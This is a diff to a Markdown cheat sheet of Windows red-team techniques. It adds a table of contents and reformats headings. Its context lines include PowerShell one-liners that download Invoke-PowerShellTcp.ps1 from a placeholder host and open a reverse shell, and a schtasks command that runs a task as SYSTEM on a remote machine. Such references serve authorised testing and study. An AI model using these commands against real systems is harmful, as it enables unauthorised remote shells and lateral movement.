@@ -1,3 +1,21 @@
+## Tools and Tricks
+
+- [gwmi Commands](#gwmi-commands)
+- [Schedule Tasks in Remote Computer](#schedule-tasks-in-remote-computer)
+- [Invoke-PowerShellTcp.ps1](#invoke-powershelltcpps1)
+- [Find-PSRemotingLocalAdminAccess.ps1](#find-psremotinglocaladminaccessps1)
+- [Find-WMILocalAdminAccess.ps1](#find-wmilocaladminaccessps1)
+- [Enter-PSSession](#enter-pssession)
+- [Invoke-Command](#invoke-command)
+- [WinRS.exe](#winrsexe)
+- [Loader.exe](#loaderexe)
+- [CMD Intersting Commands](#cmd-intersting-commands)
+    + [Task Scheduling](#task-scheduling)
+    + [Port Redirection](#port-redirection)
+- [File Copy Using Powershell](#file-copy-using-powershell)
+- [Run WMI Commands](#run-wmi-commands)
+- [BloodHound](#bloodhound)
+
 
 ### gwmi Commands
 ---
@@ -14,7 +32,7 @@ C:> schtasks /create /S <host_fqdn> /SC Weekly /RU “NT Authority\SYSTEM” /TN
 # Run the task
 C:> schtasks /Run /S <host_fqdn> /TN “<TASK_NAME>”
 ```
-### `Invoke-PowerShellTcp.ps1`
+### Invoke-PowerShellTcp.ps1
 ---
 Opens a shell. Modified Version of the original `Invoke-PowerShellTcp_Old.ps1`. Replacing the main function name to `Power`.
 
@@ -35,7 +53,7 @@ C:> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<IP
 C:> powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress <IP> -Port 443
 ```
 
-### `Find-PSRemotingLocalAdminAccess.ps1`
+### Find-PSRemotingLocalAdminAccess.ps1
 ---
 To search for local admin access on machines in a domain or local network for the current user.
 Parameters:
@@ -48,7 +66,7 @@ PS C:> Find-PSRemotingLocalAdminAccess               # Run the function
 COMPUTER-WITH-ACCESS
 PS C:>
 ```
-### `Find-WMILocalAdminAccess.ps1`
+### Find-WMILocalAdminAccess.ps1
 ---
 Runs a WMI command against the sepcified list of computers. Since, by-default, we need local administrative access on a computer to run WMI commands, a success for this fucntions means local administrative access.
 
